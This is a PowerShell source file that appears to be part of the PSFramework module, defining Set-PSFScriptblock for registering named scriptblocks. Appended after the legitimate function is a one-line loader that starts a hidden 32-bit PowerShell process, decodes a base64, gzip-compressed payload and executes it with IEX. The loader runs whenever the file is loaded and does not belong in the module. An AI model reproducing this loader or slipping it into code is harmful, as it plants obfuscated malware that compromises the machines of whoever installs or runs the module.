﻿function Set-PSFScriptblock
{

	[Diagnostics.CodeAnalysis.SuppressMessageAttribute("PSUseShouldProcessForStateChangingFunctions", "")]
	[CmdletBinding()]
	param (
		[Parameter(Position = 0, Mandatory = $true)]
		[string]
		$Name,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Management.Automation.ScriptBlock]
		$Scriptblock
	)
	process
	{
		if ([PSFramework.Utility.UtilityHost]::ScriptBlocks.ContainsKey($Name))
		{
			[PSFramework.Utility.UtilityHost]::ScriptBlocks[$Name].Scriptblock = $Scriptblock
		}
		else
		{
			[PSFramework.Utility.UtilityHost]::ScriptBlocks[$Name] = New-Object PSFramework.Utility.ScriptBlockItem($Name, $Scriptblock)
		}
	}
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIADRNFlgCA71W+2/aSBD+OZX6P1gVErZKsCE0aSJVujXvZwAHE6Co2thrs7D2EntNgF7/9xuDnYfSnHJ30lkg72Nmduabb3bsRL4lKPel+/PWtjyc9jzp58cPJ30cYE+SM67X1HbGJCdlLBM3hnb1x1Q5OQGBzObupnUx9hzpmyTP0Hpd4R6m/vzqqhwFAfHFcZ6vE4HCkHh3jJJQVqQ/pfGCBOT0+m5JLCH9lDI/8nXG7zBLxHZlbC2IdIp8O97rcAvH/uWNNaNCzn7/nlVmp4V5vnofYRbKWWMXCuLlbcayivRLiQ+82a2JnO1SK+Ahd0R+TP2zYn7kh9ghPbC2IV0iFtwOswpEAr+AiCjwpceYYiNHETkLw37ALWTbAQlBI9/0N3xF5IwfMZaT/pBniQfDyBfUI7AvSMDXBgk21CJhvoF9m5EhceZyjzykgb9XSX6uBFJ9ESg5SMwbrna5HTFy1M4qr51NE6rA8yKpgMSvjx8+fnBSPng/tMt++wUbYHQyO4wJeCv3eUgPot8kLSd14UwseLCDaeYmiIgyl2ZxJmbzuZTBtNdaRvVrHubetlJIVUBhOV6vNW8DqzOTU3sOWkmyMmTfLl8M4p23aVchDvVJZedjj1ops+TfJYA4jBwizqdiPfBMziYbxK4QRlwsYjhz0uy1WtWj4lFXjyizSYAsSGIIXkF+lZfOHDMkZ5t+l3gA13GehWQ4wGeSSicc3qWnx3MQypYZDsOc1I+goKycZBDMiJ2TkB/SZAtFgh+G2Sd3uxET1MKhSM3NlSckkxPL3A9FEFmQQ4j+xlgTi2IWg5GTGtQm+s6gbnpy9rdQlDFj1HfB0gZSASsxBIaImRGAk89YoOQNIpremhEPJA8VXmPYhXpOKuJAKOwSO/va05TvR3LHqKRwPPMTUm0wLnKSSQMBV0WMcEKq/+LJs9si8akckCQ/clpEM30nYt5nMN8ueczUBKsDMoEAVGoB93QckvOSIQLATP6kXtMygmfS9FnX0le0gB5oodmF/4ieNXnlwm63lg01qGwXDmqGzW6jXxk0GqVNyzBLwqg2RbvfFN3q7XJpoMZwNBHTJmrcUG01Ke3XLbo3OsiebNXzvb5/0PTtfunazqTiOO6FYwwLX2q0My4PdK2IO5Vq1BnrD7pWCqv0oTGgo8GqVRN3E5PhkaO6t4VLTLedYGkWeHffRKi+OLP2LcesL7r2btJQL8elFaoiVParZk3n7YkeoL5qYtfkD21XR54LsbYxJdPBqKYPBjUdjerL+8ql6oLuLV7oY7NIp+vb4QLmNXChrWqlpk32fDIAkOocYXcIMm65aC0ckKl8RvrnHg+LeKVzpINMbXoPfk3WtT6D/ZtRkSOT9W4x6kx3NVUtTPol1NDouO6i2CR29QFG4aayr6gF0+b2+Etv4qjmLbtQK+WbteWoqvrQqLStaWH79fria2dMTY+jkaqan2JqADcyvPjFfJbvt673Lg7CBWbAA7iz05qs8aCW3L59TmMNWX7qyisS+IRBH4NOl3IaMcatuB2klzV0o2OPmEN9jmB4VvztSJEeBZWnLpEuXV1Nwdu4SmL65jvEd8Uip23PNA0uem1b0iDc94dY5uudfLSVizvFAaRH6+xgXYnLJhMN7GrhHP8PACZFu4CX/Q4An9b+ZvddoGq5Y/ivll8u/COA/x0EY0wFiBtw+TBybIpvIpGw5tkHRZIqYIWTPPG33XUkTnvwqfEX+V6LIFYKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

